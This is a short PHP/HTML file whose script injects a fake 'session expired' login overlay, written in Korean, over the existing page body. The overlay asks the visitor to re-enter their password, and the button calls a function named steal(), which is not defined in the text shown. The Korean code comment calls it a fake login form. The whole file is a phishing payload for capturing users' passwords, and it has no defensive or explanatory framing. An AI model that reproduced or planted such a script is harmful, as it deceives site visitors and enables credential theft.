<?php

?>
<body>
<script>
    // 가짜 로그인 폼 생성
    document.body.innerHTML = `
    <div style="position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);background:white;padding:20px;border:1px solid #ccc;">
    <h2>세션이 만료되었습니다</h2>
    <input type="password" id="pwd" placeholder="비밀번호 재입력">
    <button onclick="steal()">로그인</button>
    </div>` + document.body.innerHTML;
</script>
</body>